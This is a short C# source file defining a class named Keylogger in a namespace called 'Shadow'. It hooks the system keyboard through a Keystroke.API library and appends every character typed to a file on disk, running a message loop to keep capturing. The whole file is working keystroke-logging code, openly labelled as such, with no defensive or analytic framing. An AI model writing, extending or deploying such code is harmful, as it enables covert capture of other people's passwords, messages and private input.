using Keystroke.API;
using System;
using System.IO;
using System.Windows.Forms;

namespace Shadow
{
    public class Keylogger
    {
        private String Path { get; set; }

        public Keylogger(String path)
        {
            Path = path;
        }

        public void Start()
        {
            // Keystroke API Listener
            using (var api = new KeystrokeAPI())
            {
                api.CreateKeyboardHook((character) => {
                    File.AppendAllText(this.Path, character.ToString());
                });
                Application.Run();
            }
        }
    }
}
